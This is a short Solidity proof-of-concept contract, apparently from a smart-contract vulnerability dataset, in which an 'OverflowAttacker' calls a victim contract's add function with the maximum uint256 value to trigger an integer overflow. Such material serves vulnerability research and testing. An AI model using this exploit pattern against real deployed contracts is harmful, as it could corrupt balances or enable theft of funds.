pragma solidity ^0.8.0;

import "../dataset/arithmetic/integer_overflow_1.sol";

contract OverflowAttacker {
    Overflow public victim_contract;

    constructor (address _overflowAddress) {
        victim_contract = Overflow(_overflowAddress);
    }

    function addMax() public {
        uint maxUint = 2**256 - 1;

        victim_contract.add(maxUint);
    }
}
